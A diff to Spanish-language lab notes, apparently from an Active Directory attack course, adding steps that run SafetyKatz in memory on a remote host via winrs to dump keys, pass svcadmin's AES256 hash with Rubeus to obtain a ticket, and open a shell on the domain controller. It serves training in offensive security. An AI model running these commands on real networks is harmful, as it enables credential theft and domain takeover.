@@ -422,7 +422,12 @@ Ahora para ejecutar SafetyKatz y poder ejecutarlo en la memoria
 $null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
 ```
 
-Obteniendo las credenciales de svcadmin, ahora con Rubeus le pasaremos el hash aes256 y se nos permitira conectarnos vias winrm
+Obteniendo las credenciales de svcadmin, ahora con Rubeus en una nueva terminal como administrador  le pasaremos el hash aes256 y se nos permitira conectarnos via winrs
 ```shell
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+
+Pudiendo ahora acceder a svcadmin con winrs
+```shell
+winrs -r:dcorp-dc cmd
 ```
